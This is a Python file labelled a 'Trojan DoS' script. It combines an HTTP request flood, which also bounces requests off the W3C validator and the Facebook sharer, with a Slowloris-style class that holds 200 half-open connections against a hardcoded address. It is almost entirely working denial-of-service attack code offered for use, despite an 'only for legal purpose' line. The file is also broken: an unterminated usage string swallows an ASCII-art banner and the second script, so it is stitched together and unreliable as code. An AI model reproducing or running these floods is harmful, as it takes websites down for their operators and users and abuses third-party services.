#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Trojan Dos Script v.1
# by MR.K7C8NG
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot Trojan...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--mengirim Trojan--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<-> web site down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe website down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m  	Trojan DDOS

    print \
""""""""""""""""""""""""""""""""""""""""""""""""""""""""
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,.,**((##########/**,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
                                                         ,***,..                                 ..,***.                                                        
                                                 ,**,.       ,***//*.....,,,,*,*,**,*,... ..,*/***,.       .***.                                                
                                           ,/*      .,//. .,*//,. ./  .. ,*..( ,# ,# ,(  .  .%  .*(/*...,//,.     ./*.                                          
                                      ./.     ,(*. .(/.    (.   *  /#, */.*/ (,.(.(*.(,.(, (#*  .  ./*    ,(/. ./(.     ,/.                                     
                                  **.    //,.*/*. ,(,       (/*, *# ./ .#. , ..(*/, ., .* ,( .(. (/**       */ ..*/. ,**    .*,                                 
                              ,/.   ,/*.*(,         */(,( .#/  (, .*           */.           /  /, .(/ ./,((.        ./*../*.   .*.                             
                           *,   .** */.   .#/.  ,,    (,*#,  (                 ( (                */. /(.(*   .#.  ,#/    */. /*    /,                          
                        /.   .( .%,          ,(,( .( ./#, .( .                /. ,.                 */  /#* ,* .(,(.          */ .#.   **                       
                     *,   */../*//.  ,(.        */ ,/(*  *                  ,.(///,..                 .. .((* ./.        //. .,/*,/..(,   *,                    
                  ./   ./ ./.      ./(/*,. ,(/. ./((*  .                    (/** /(/,                   .  ./((* .,/(..,*(*/*       ./../.  .*                  
                .*   ** */           #,*,#,  ,*.//   ..                     ( /* (.,,  .                      .(,.*.. /(.*.,           ** **   *.               
              *,   (. /*(.           ( (     ,.   .,/.                  .(/(/(#(((#(*(*(                   ,*..   ,.    .*.*           */,(.,(   *.             
            ,,   (.*/,/.            .(*/.    *(((*.                      .(//*//.//*(/,                       ,/(((,    ,(**             */,/,./   *.           
          .*   *// **        .*.*/(#/***/,                               *#(((/((((#(##,                               /****/((/,,/         (,.(*/  ./          
         *.  ,(. (      .*(#(*. .(***  *,#***/((#%#.                    .(*#///#/#(/(#/(                     ,%%#(/***(**. ,./,* .,/##/,.     ,( *#,  *.        
       .*  .(  /.                   .(,(                              /#((*(*(.///*(*(/#(#*                             .*,*                    ,* ,/   *       
      ,,  ,* .*                   *//(///(, .                                  ,(.                                 .. *//(///(                    *  (.  /.     
     ,.  *. .*                  .(/ *   / (*,,,,*//.                       ,#*.(,/.((.                       */***,,,(( #  ,,.(*                   /  /,  *.    
    *.  #. .,              (*..  ./(((.(                                 .*(* /(.#,.*/*                                 ,/,((/,.   .(*              /  .*  ,.   
   ,   *.  /               ,/#.,/((((////((/(((*.                        *.(* #. ** ,(*.                       .,/((*((///(/(((/(./(*.              ./  **  *   
   *  *,  (   .,**///******/*,..,* .*   *. #    .*//,                    .*,//*, *,(/.*                     *(/,.   ,, /.   (. * ..**/****,*///*,,.  .,  /,  /  
  /  .*  (/*..                 ./..(.   ,*..(#/.    .,,                    .((/(,((#,                     *..    ,/(/../    ,,.,/                  .,*(*  /   * 
 ,   / ,(//                    .*/#%##.%##(/,   /((*                        (,(, /,,,                      ..(/#,  ./(##(/.(###/,                    ,//(.*(  * 
 *  .#, /.                   ./((*///((////(/* /.    *(.                     */*,/#.                     *(.    ,, //*(//((///*(/(*                    *, /(.  /
.,  (, *.             .,*/, .*(/  ,,     (   (   .*(,   *(  .                 .* /                 .  *(.   *(.   .,  ,,     *   (*, .*/*.              /  (*  /
/   # ./           ./.   #/..#.   *      *,   ,(#*   ,(/   (. .,             ./****            . *  /,  ,/(.  .(#(.   ,.     /    ,* .#*   /*           ./ ./  .
(  ./ /(,             //  .(,     .,*(*(*, .///     */   /(  /,  /            *. ,.           ,(  (  .#   .#.  . .((*..,*/*/,..    .//  ,(.             /(,./   
(  ,/*.*         .**.,/*.   ,(,,****,********,,(       *#, ,(, ,(  ,/*//**./*,/,/*,,*/.//*/*/, .(  // ./(       ,*,,******/***,*,,,/    ,/*.,*,          (.(/   
(  .( (.     ./*,*/         ((, ./,(    ./,(  *//    .(/  //  //    ./ /  (. ./  .*  ,, .(.(.   ,#, ,#, .//     #(, .*,/    ./,*  *(,        ./*,/*.     ,,./   
(  .( /,/(#*(/              *    #        ,,    (   ((.../*  /(.    %/(*(.,/.,(.,,*..(*./,#**     #,  /(  ***  ./    *         *   .*             .(*//#,,../  ,
..  #,*,*.               **      %        .*      /,(  //. ,//       /,/*((/(*(/./(*(/(#/(,#      ,*/  //. .(*,      *        .*      (.               ,(.*.*  *
 *  ,/ *  .,,               (/(/(****,***/*/(/(*(,*.   ,  ,*#      ./* /( ,/,,,,,*,,,*. (* **       /(  ,.   /,(*/(/#*/***,****/(/((*              .*,  *.,(,  (
 *   /.,(,*              **  ,#./,,  ( /   ,,/**./       / *      .*,//. .(/*,,,,,,,*//  ,/*,(.     ,**.      ././*./.   ,.* .*/**#. .(,             .*,/ *(  ,.
 .*  ,(* /. ,#.         ..*#* ./*   .( (   .*(./.       (.# .(./,/#/*(%,#../ ,* . ( .(..**#//*/#(.*/. (./       *,,,/.   *.*   ,,* .%(,.          /(   ( #(   , 
  *.  /* /** /          ,/.,/../*    # /  ./*.(,*/    .*   /. % /, .(  .//   //  .(,  .(*   /  /, / *.  .(    ./,*(,(,  .* *   .** *(.,*.         ,*./*/ (*  ,. 
   *   /.*. (     /*....*#    *,,    ( ( (,,,(,(,     . .*,,  .* *  .*   /   ,,   (   .(   (  *, #.  (.(  ..    //,*,./* * *    (*,   .(,..../,    ., *,*/  ,.  
    (  .(/ .*  . ./(*(.,#.  ,(,*     (./   ./,(**.  *,. *(.     /,/* */  ,,  .*  ./  ./  ./. /,**     *(,../.  /,/(.(    * *     / /.  ,#.///(* ,  ., .(/  .*   
     *   /. /. .(,./. .(.   *(       (.(  /,/   .(/,/. *(/        ,/,#.(/.#/.*#, *#,,(/.(/*#,#.       ./(, */,(*   .(** .*.*       (.  ../  **./*  ,, //  ,*    
      /.  /, *(*             ((      (./**/           /(/ ,//.       .//,*,**********,*,*#,        /*/..#(,          ,(/.*.*     ,(,             .(, /*  .,     
       ,.  ,* /.    ./     .(. *.    ( (/.           *,*,(  (/**      .(.               *(       ///* ,(,(*.          .*(* *    *. **     ./     *..(.  *.      
        .*   /..*   *,*  /,.   /.   */*(,         .*,*#*.             .**...............(. .           .,/(,*,          //*(    /.  . (,..**.  ./ */   /        
          *.  .( //,.( .* ,*       **   *           (,     ,(..,,//((/,.. .             .,*#((/*,.../.     /*          *,   (.      ./  # .( **,.#.  ,.         
           ./   ,(( ,* # .(*/.   .(#(***(,         /(.,(**,        .       .,       /.      .        .,*//,,(.         //**/(#/    *//#  / * ,*(.  .*           
             .*   *#.,*#.*.( .(,////*/***(. .(/   ,#    (*,.     .,*////****,,,*,,,******///**,.     .,//   ,#.   (*  */**/**(.(,*/. / /./(.*#,  .*             
               .*   .#./(.,*/ /#(,         ,(#.*/,#. .,/../((,.  .,*/((((/*,,,......,*//((##/*.   .//(*..#.. /( /.*/(.         *##/*.* ,(**(.  .*               
                  /    /#(../ /,//////////////,.#*,/..(..../*,*/(/*.......................  ..*(/**,/*...,/ ,./*# *///////////(((/,.(.,(#*   ,,                 
                    **   .(/*. ,*    */      /,   *./,/,*( */.****/.          ,***.          ./**** /,***./,//.   *.     .#.    (. *.//.  .*.                   
                       /.   .//   /.* /    ((. ,* *.,*( ,* .     .(*../(//(/.,((((/..(///(* .**      ..(../(.*, /. ,#,    #*.,(  ,#/    **                      
                          /.   ./*  *..(  .*.(,..*       .  /(.###%,     .     ..     ..     /#%##,%,         ., /,,.*  ./ /.  (,    /,                         
                             ,*    ./// .*/, (*..,  .(        ,*#/ ,//. ,/, */     (. */. ,((..#/,.       ,/  ./ **, (/. .((/.   ./.                            
                                .*,     */,**  /. /,/.(    (,    *****,   ,/./ .. .(./.   ****/.    /,    /,**, ,, ./,*(*    .**                                
                                     **.    .*#*.(. ., ,(. /./        (, . ./*,( ((,/... /,       .#*..,/. #  *,./(,     .*,                                    
                                         .**      .,(#(/.   *, ,((,..*.,.  *,  ,/,  /,. / ,,.,*#*. (.   ,((#/,      ./*                                         
                                               ,,*,       .,,*(#/*.  .(..,/,*(//,(*(.**, .*   ,/(((/*..       ,*,.                                              
                                                      .**,,.            ..,.,*,,*,,,,,..            ..,,**.                                                     
                                                                 .,/((*,,....... .......,*/((/,.                 

    """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
class DeadlyBooring():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.newSocket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))


if __name__ == "__main__":
    dos = DeadlyBooring("192.168.0.236", 81, socketsCount=200)
    dos.attack(timeout=60*10)
